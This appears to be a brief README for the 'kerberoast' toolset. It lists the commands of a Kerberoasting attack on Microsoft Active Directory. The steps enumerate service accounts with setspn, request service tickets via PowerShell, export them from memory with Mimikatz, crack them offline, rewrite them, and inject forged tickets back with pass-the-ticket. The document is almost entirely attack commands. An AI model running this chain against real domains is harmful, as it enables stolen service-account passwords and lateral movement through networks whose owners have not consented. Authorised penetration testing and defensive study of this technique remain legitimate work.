kerberoast
==========

Kerberoast is a series of tools for attacking MS Kerberos implementations. Below is a brief overview of what each tool does.

Extract all accounts in use as SPN
setspn -T medin -Q */* | Select-String Users

Request the tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"

Extract from ram with Mimikatz
kerberos::list /export

Crack with
./tgsrepcrack.py

Rewrite
./kerberoast.py

Inject back into RAM
kerberos::ptt sql.kirbi
